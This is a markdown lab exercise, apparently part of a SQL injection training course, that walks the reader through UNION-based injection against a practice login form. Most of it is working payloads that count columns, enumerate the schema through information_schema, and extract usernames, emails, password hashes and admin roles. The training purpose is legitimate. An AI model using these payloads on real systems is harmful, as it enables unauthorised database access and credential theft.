# 📊 Lab 2: Data Extraction with UNION

## 🎯 Objective

Learn to extract sensitive data from database using UNION-based SQL injection.

## 📝 Prerequisites

- Completed Lab 1: Authentication Bypass
- Understanding of UNION operator
- Knowledge of information_schema

## 📚 Background

UNION-based SQL injection allows attackers to extract data from other tables by combining multiple SELECT statements. This lab focuses on systematic data extraction.

## 📖 Tasks

### Task 1: Column Count Discovery

**Goal:** Determine number of columns in the original query

**Method 1: ORDER BY**
```
Username: ' ORDER BY 1 --
Username: ' ORDER BY 2 --
Username: ' ORDER BY 3 --
Username: ' ORDER BY 4 --
Username: ' ORDER BY 5 --
Username: ' ORDER BY 6 --
```

**Document:**
```
ORDER BY 5: [Success/Error]
ORDER BY 6: [Success/Error]
Conclusion: [Number of columns] = _____
```

**Method 2: UNION SELECT NULL**
```
Username: ' UNION SELECT NULL --
Username: ' UNION SELECT NULL, NULL --
Username: ' UNION SELECT NULL, NULL, NULL --
```

### Task 2: Identify Injectable Columns

**Goal:** Find which columns display data

**Try:**
```
Username: ' UNION SELECT 'A', 'B', 'C', 'D', 'E' --
Username: ' UNION SELECT 1, 2, 3, 4, 5 --
```

**Document which columns are displayed in the output.**

### Task 3: Database Enumeration

**Extract database version:**
```
Username: ' UNION SELECT @@version, NULL, NULL, NULL, NULL --
Username: ' UNION SELECT VERSION(), NULL, NULL, NULL, NULL --
```

**Extract current database:**
```
Username: ' UNION SELECT database(), NULL, NULL, NULL, NULL --
```

**Extract current user:**
```
Username: ' UNION SELECT user(), NULL, NULL, NULL, NULL --
Username: ' UNION SELECT current_user(), NULL, NULL, NULL, NULL --
```

### Task 4: Table Discovery

**List all tables:**
```
Username: ' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --
```

**Better format:**
```
Username: ' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database() --
```

**Document all tables found.**

### Task 5: Column Discovery

**List columns for 'users' table:**
```
Username: ' UNION SELECT column_name, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
```

**All columns at once:**
```
Username: ' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
```

**Document all columns in users table.**

### Task 6: Data Extraction

**Extract all usernames:**
```
Username: ' UNION SELECT GROUP_CONCAT(username), NULL, NULL, NULL, NULL FROM users --
```

**Extract usernames and emails:**
```
Username: ' UNION SELECT username, email, NULL, NULL, NULL FROM users --
```

**Extract passwords:**
```
Username: ' UNION SELECT username, password, NULL, NULL, NULL FROM users --
```

**All data at once:**
```
Username: ' UNION SELECT CONCAT(username, ':', email, ':', role), NULL, NULL, NULL, NULL FROM users --
```

## 📋 Lab Report

### Database Schema Discovered

```
Database: sqli_academy

Tables:
1. users
2. products
3. [others you found]

Users table columns:
- id
- username
- password
- email
- role
- [others]

Products table columns:
- [list columns]
```

### Data Extracted

```
Usernames found:
- admin
- john_doe
- alice
- [others]

Password hashes:
- admin: [hash]
- john_doe: [hash]

Admin accounts:
- [list]
```

### Advanced Techniques

**Extract from multiple tables:**
```
Username: ' UNION SELECT username, NULL, NULL, NULL, NULL FROM users UNION SELECT name, NULL, NULL, NULL, NULL FROM products --
```

**Conditional extraction:**
```
Username: ' UNION SELECT username, password, NULL, NULL, NULL FROM users WHERE role='admin' --
```

## ✅ Success Criteria

- [ ] Determined correct number of columns
- [ ] Successfully used UNION SELECT
- [ ] Listed all database tables
- [ ] Extracted column names
- [ ] Retrieved user data
- [ ] Documented complete database schema

## 🔄 Next Lab

**[Lab 3: Secure Implementation](lab3-secure-implementation.md)**

---

**Practice makes perfect! 🚀**